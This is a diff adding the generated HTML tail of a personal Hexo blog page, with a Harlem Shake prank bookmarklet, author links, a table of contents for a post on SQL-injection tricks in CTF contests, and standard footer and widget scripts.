+        var t = new RegExp("\\b" + s + "\\b");
+        for (var n = 0; n < e.length; ) {
+            e[n].className = e[n].className.replace(t, "")
+        }
+    }
+ 
+    var e = 30;
+    var t = 30;
+    var n = 350;
+    var r = 350;
+    var i = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3";
+    var s = "mw-harlem_shake_me";
+    var o = "im_first";
+    var u = ["im_drunk", "im_baked", "im_trippin", "im_blown"];
+    var a = "mw-strobe_light";
+    var f = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css";
+    var l = "mw_added_css";
+    var b = g();
+    var w = y();
+    var C = document.getElementsByTagName("*");
+    var k = null;
+    for (var L = 0; L < C.length; L++) {
+        var A = C[L];
+        if (v(A)) {
+            if (E(A)) {
+                k = A;
+                break
+            }
+        }
+    }
+    if (A === null) {
+        console.warn("Could not find a node of the right size. Please try a different page.");
+        return
+    }
+    c();
+    S();
+    var O = [];
+    for (var L = 0; L < C.length; L++) {
+        var A = C[L];
+        if (v(A)) {
+            O.push(A)
+        }
+    }
+})()'><i class="fa fa-music"></i> High</a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/wlfreesky" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:wlfsky@hotmail.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/5484401731" target="_blank" title="微博">
+                    
+                      <i class="fa fa-fw fa-weibo"></i>微博</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="http://music.163.com/#/user/home?id=387055149" target="_blank" title="网易云音乐">
+                    
+                      <i class="fa fa-fw fa-music"></i>网易云音乐</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf中sql注入下的一些小技巧"><span class="nav-number">1.</span> <span class="nav-text">ctf中sql注入下的一些小技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注释符"><span class="nav-number">1.1.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断当前库是否有字段名"><span class="nav-number">1.2.</span> <span class="nav-text">判断当前库是否有字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#limit下的字段数判断"><span class="nav-number">1.3.</span> <span class="nav-text">limit下的字段数判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#or条件下的回显"><span class="nav-number">1.4.</span> <span class="nav-text">or条件下的回显</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#concat与concat-ws与group-concat"><span class="nav-number">1.5.</span> <span class="nav-text">concat与concat_ws与group_concat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注下的条件语句和时间函数"><span class="nav-number">1.6.</span> <span class="nav-text">盲注下的条件语句和时间函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#逻辑操作符被过滤"><span class="nav-number">1.7.</span> <span class="nav-text">逻辑操作符被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过-’被过滤"><span class="nav-number">1.8.</span> <span class="nav-text">绕过\’被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#表名等关键字被过滤"><span class="nav-number">1.9.</span> <span class="nav-text">表名等关键字被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#表单认证绕过"><span class="nav-number">1.10.</span> <span class="nav-text">表单认证绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql字符编码利用技巧"><span class="nav-number">1.11.</span> <span class="nav-text">Mysql字符编码利用技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#隐式类型转换"><span class="nav-number">1.12.</span> <span class="nav-text">隐式类型转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤了-amp-等逻辑处理字符"><span class="nav-number">1.13.</span> <span class="nav-text">过滤了&,|,*,/,=等逻辑处理字符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一点实战例子"><span class="nav-number">2.</span> <span class="nav-text">一点实战例子</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#陕西省网络空间安全"><span class="nav-number">2.1.</span> <span class="nav-text">陕西省网络空间安全</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwnhubcuit校赛"><span class="nav-number">2.2.</span> <span class="nav-text">pwnhubcuit校赛</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#webhacking-kr"><span class="nav-number">2.3.</span> <span class="nav-text">webhacking,kr</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wlfsky</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">33.2k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user">本站访客数</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人次
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye">本站总访问量</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    document.getElementById("live2dcanvas").style.width = '75px';
+    document.getElementById("live2dcanvas").style.height = '150px';
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/wanko.model.json", 0.5);});
+})();
+</script>
+
+
+</body>
+</html>
